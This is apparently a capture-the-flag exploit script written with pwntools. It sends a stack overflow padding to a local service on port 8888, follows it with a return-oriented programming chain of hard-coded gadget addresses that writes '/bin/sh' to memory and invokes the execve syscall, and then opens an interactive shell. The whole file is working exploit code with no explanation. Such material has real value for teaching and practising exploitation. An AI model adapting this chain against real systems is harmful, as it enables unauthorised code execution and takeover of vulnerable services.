#!/usr/bin/env python

from pwn import *

r = remote('0.0.0.0', 8888)
context.arch = 'amd64'

payload = ''
payload += 'a'*29 + '\x00' + 'a'*10

mov_rdi_rsi = 0x47a712
pop_rsi = 0x401617
pop_rdi = 0x4014f6
pop_rax_rdx_rbx = 0x478726
buf = 0x6ca080
syscall = 0x4673c5

payload1 = flat([pop_rdi, buf, pop_rsi, '/bin/sh\x00', mov_rdi_rsi, pop_rsi, 0, pop_rax_rdx_rbx, 0x3b, 0, 0, syscall])

r.recvuntil('\n')
#raw_input('##############')
r.sendline(payload + payload1)
r.interactive()

